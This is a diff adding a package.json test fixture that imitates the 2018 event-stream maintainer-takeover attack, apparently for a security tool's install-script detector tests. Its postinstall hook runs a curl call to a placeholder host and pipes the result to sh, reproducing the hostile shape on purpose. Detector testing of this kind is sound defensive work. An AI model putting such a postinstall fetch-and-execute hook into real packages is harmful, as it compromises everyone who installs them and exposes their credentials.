@@ -1,0 +1,8 @@
+{
+  "name": "event-stream-historic-fixture",
+  "version": "3.3.6",
+  "description": "Sanitized recreation of the November 2018 event-stream@3.3.6 maintainer-takeover attack (flatmap-stream payload). The original malice lived in a transitive dep's payload that decrypted at runtime against the host process and exfiltrated wallet credentials. The structural shape that would fire chainsaw's install-script detector is a postinstall that reaches the network and an obfuscated payload child_process.exec — both reproduced here against placeholder targets so the detector parity tests can assert on the same booleans the live package would have triggered.",
+  "scripts": {
+    "postinstall": "node -e \"require('child_process').exec('curl -s EXFIL_PLACEHOLDER/wallet | sh')\""
+  }
+}
